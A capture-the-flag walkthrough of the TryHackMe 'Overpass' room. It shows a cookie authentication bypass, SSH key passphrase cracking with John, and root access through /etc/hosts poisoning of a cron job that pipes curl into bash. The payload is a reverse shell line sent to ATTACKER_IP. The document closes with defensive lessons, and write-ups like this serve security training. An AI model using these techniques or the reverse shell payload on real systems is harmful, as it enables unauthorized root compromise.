# Overpass

What happens when some broke CompSci students make a password manager?

Obviously a perfect commercial success!

Room: https://tryhackme.com/room/overpass

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/overpass.md


## Overview

Overpass is a Linux web exploitation and privilege escalation room. The path starts with web enumeration, moves into a client-side authentication bypass, then SSH key cracking, and finishes with privilege escalation through an unsafe root cron job.

The main issues found were:

* Client-side session validation
* Exposed SSH private key
* Weak SSH key passphrase
* Password reuse / password storage weakness
* Root cron job executing a remote script with `curl | bash`
* Writable `/etc/hosts`, allowing hostname poisoning

---

## Enumeration

I started with directory enumeration using `gobuster`.

```bash
gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Interesting results:

```text
/404.html             (Status: 200) [Size: 782]
/aboutus              (Status: 301) [--> aboutus/]
/admin                (Status: 301) [--> /admin/]
/admin.html           (Status: 200) [Size: 1525]
/cookie.js            (Status: 200) [Size: 1502]
/css                  (Status: 301) [--> css/]
/downloads            (Status: 301) [--> downloads/]
/img                  (Status: 301) [--> img/]
/index.html           (Status: 301) [--> ./]
/login.js             (Status: 200) [Size: 1779]
/main.js              (Status: 200) [Size: 28]
```

The most interesting files were:

```text
/admin.html
/admin/
/login.js
/cookie.js
```

---

## Client-side Authentication Bypass

Looking at the JavaScript files showed that the admin authentication was handled client side using a cookie.

Because the page checked for the presence of a session token rather than properly validating it server side, I was able to create my own cookie in the browser console.

```javascript
Cookies.set('SessionToken', 'abc;123', {
  path: '/',
  expires: 7,
  sameSite: 'Lax',
});
```

After setting the cookie, I browsed to:

```text
http://TARGET_IP/admin/
```

This gave access to the Overpass administrator area.

---

## Admin Page Information Disclosure

The admin page contained a note for James:

```text
Welcome to the Overpass Administrator area
A secure password manager with support for Windows, Linux, MacOS and more

Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox
```

The page exposed an SSH private key for James. I saved the private key locally as:

```text
rsa
```

Then I fixed the permissions:

```bash
chmod 600 rsa
```

---

## Cracking the SSH Key

The private key was passphrase protected, so I converted it into a John-compatible hash.

```bash
python3 /opt/john/ssh2john.py rsa > ssh.hash
```

Then I cracked it with `rockyou.txt`.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

John found the passphrase:

```text
james13
```

---

## SSH Access as James

Using the cracked key passphrase, I logged in as James.

```bash
ssh -i rsa james@TARGET_IP
```

Once logged in, I captured the user flag.

```bash
cat /home/james/user.txt
```

User flag:

```text
thm{65c1aaf00xxxxxxxxxx281e6bf7}
```

---

## Overpass Password Store

The box had the `overpass` password manager installed.

```bash
overpass
```

I selected option `4` to retrieve all stored passwords.

```text
Welcome to Overpass
Options:
1    Retrieve Password For Service
2    Set or Update Password For Service
3    Delete Password For Service
4    Retrieve All Passwords
5    Exit
Choose an option: 4
```

Output:

```text
System    saydraxxxxxxicture
```

This showed that James had stored a system password in Overpass.

---

## Local Enumeration

I checked James' home directory and found a `todo.txt` file.

```bash
cat /home/james/todo.txt
```

Contents:

```text
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

The final note about the automated build script was the key privilege escalation hint.

---

## Cron Job Discovery

I checked the system crontab.

```bash
cat /etc/crontab
```

There was a root cron job running every minute:

```text
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

This is dangerous because root is downloading a script and piping it directly into `bash`.

If I could control where `overpass.thm` resolved, I could serve my own malicious `buildscript.sh` and have root execute it.

---

## Hostname Poisoning

I checked `/etc/hosts` and found that `overpass.thm` already had an entry.

```bash
cat /etc/hosts
```

Because James could edit the file, I updated the existing `overpass.thm` entry with `nano` and changed it to point to my AttackBox IP.

```bash
nano /etc/hosts
```

The edited entry looked like this:

```text
ATTACKBOX_IP overpass.thm
```

This meant that when the root cron job ran:

```bash
curl overpass.thm/downloads/src/buildscript.sh | bash
```

the target would resolve `overpass.thm` to my AttackBox instead of the original server.

From there, I could serve my own malicious `downloads/src/buildscript.sh`, and root would download and execute it.

---

## Malicious Build Script

On my attacker machine, I created the expected directory structure.

```bash
mkdir -p downloads/src
```

Then I created a fake `buildscript.sh`.

```bash
nano downloads/src/buildscript.sh
```

Payload:

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

Then I started a Python web server on port `80`.

```bash
sudo python3 -m http.server 80
```

In another terminal, I started a netcat listener.

```bash
nc -lvnp 4444
```

---

## Root Shell

After waiting for the cron job to run, I received a reverse shell.

```text
Connection received on TARGET_IP
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
root@target:~#
```

I confirmed root access.

```bash
id
```

Then I read the root flag.

```bash
cd /root
cat root.txt
```

Root flag:

```text
thm{7f336f8XXXXXXX53bb}
```

---

## Attack Chain Summary

```text
1. Enumerated web directories with gobuster
2. Found /admin.html, /admin/, login.js and cookie.js
3. Discovered client-side cookie-based authentication
4. Set a fake SessionToken cookie in the browser
5. Accessed the admin area
6. Found James' SSH private key
7. Converted the key with ssh2john
8. Cracked the key passphrase with John: james13
9. Logged in over SSH as james
10. Read user.txt
11. Used the overpass password manager to retrieve stored passwords
12. Found todo.txt hinting at automated builds
13. Found root cron job running curl overpass.thm/downloads/src/buildscript.sh | bash
14. Poisoned /etc/hosts so overpass.thm pointed to attacker IP
15. Hosted a malicious buildscript.sh
16. Root cron executed the script
17. Received a root reverse shell
18. Read root.txt
```

---

## Key Takeaways

This room demonstrates several important security issues.

Client-side authentication should never be trusted. The server should validate sessions properly instead of relying on a browser-side cookie check.

Private keys should never be exposed through a web application. Even when passphrase protected, weak passphrases can be cracked quickly.

The privilege escalation was caused by an unsafe root cron job. Running `curl | bash` as root is dangerous, especially when the hostname can be redirected through a writable `/etc/hosts` file.

The most critical misconfiguration was:

```bash
curl overpass.thm/downloads/src/buildscript.sh | bash
```

Because this command trusted both DNS resolution and the contents of a remote script, controlling either one gave command execution as root.
